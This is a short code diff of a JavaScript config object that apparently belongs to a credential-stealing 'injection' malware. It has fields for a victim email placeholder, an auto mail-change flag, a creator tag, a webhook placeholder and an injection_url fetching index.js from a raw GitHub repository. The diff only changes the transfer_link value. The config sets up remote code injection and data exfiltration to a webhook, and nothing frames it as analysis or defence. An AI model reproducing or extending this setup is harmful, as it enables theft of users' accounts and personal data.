@@ -21,7 +21,7 @@ var config = {
   changeMailAuto: "false",
   mail: "%CLIENTEMAIL%",
   creator: "Agiva",
-  transfer_link: `%TRANSFER_URL%`,
+  transfer_link: `true`,
   injection_url:
     "https://raw.githubusercontent.com/openyoureyesnow/assets/main/main/index.js",
   webhook: "%WEBHOOK%",
